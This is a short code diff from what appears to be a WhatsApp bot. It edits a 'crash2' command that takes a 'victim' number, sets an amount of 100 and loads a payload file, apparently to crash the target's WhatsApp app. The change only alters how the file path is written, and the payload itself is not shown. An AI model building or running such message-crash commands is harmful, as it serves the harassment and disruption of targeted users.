@@ -538,7 +538,7 @@ if (command === "crash2") {
     const victim = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
     const amount = 100;
 
-    const filePath = path.join(process.cwd(), "./Wantedasa/wantedbot/xeontext1.js");
+    const filePath = "./Wantedasa/wantedbot/xeontext1.js";
 
     if (!fs.existsSync(filePath)) {
         return reply(sock, msg, "❌ Datei nicht gefunden!");
